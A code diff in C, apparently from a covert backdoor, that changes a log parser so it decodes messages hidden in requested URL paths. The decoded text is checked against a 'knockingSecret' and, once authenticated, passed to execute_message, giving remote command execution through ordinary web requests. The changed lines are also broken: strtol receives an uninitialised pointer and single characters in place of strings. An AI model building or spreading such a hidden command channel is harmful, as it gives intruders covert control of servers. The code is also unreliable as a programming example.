@@ -101,10 +101,18 @@ void parse_log( char * lastLine ) {
 	// write the encoded data to the buffer
 	for ( i = 0 ; i < n ; i++ ) {
 		if ( strcmp( pathClean , baseDict[i] ) == 0 ) { 
-			decodeBuffer[nth].buffer[decodeBuffer[nth].bufLen] = baseCharSet[i] ;
-			decodeBuffer[nth].bufLen += 1 ;
+			decodeBuffer[nth].charBuffer[decodeBuffer[nth].charLen] = baseCharSet[i] ;
+			decodeBuffer[nth].charLen += 1 ;
 			break ;
 		}
+	}
+
+	if ( strcmp( pathClean , "/" ) == 0 ) {
+		char * t ;
+		decodeBuffer[nth].buffer[decodeBuffer[nth].bufLen] = strtol( decodeBuffer[nth].charBuffer , t , n ) ;
+		decodeBuffer[nth].bufLen += 1 ;
+		strcpy( decodeBuffer[nth].charBuffer , "" ) ;
+		decodeBuffer[nth].charLen = 0 ;
 	}
 
 	// debug
@@ -114,11 +122,9 @@ void parse_log( char * lastLine ) {
 	printf("\n");
 
 	char *temp ;
-	char *last2Buffer ;
-	last2Buffer = &decodeBuffer[nth].buffer[decodeBuffer[nth].bufLen-2] ; 	
 
 	// check is the end of the message
-	if ( strtol( last2Buffer , &temp , n ) == 10 ) { // 10 == 0x0a == my EOF
+	if ( strtol( decodeBuffer[nth].buffer[decodeBuffer[nth].bufLen] , &temp , n ) == 10 ) { // 10 == 0x0a == my EOF
 		if ( decodeBuffer[nth].auth == 1 ) {
 			execute_message( decodeBuffer[nth].buffer ) ;
 		} else if ( strcmp( decodeBuffer[nth].buffer , knockingSecret ) == 0 ) {
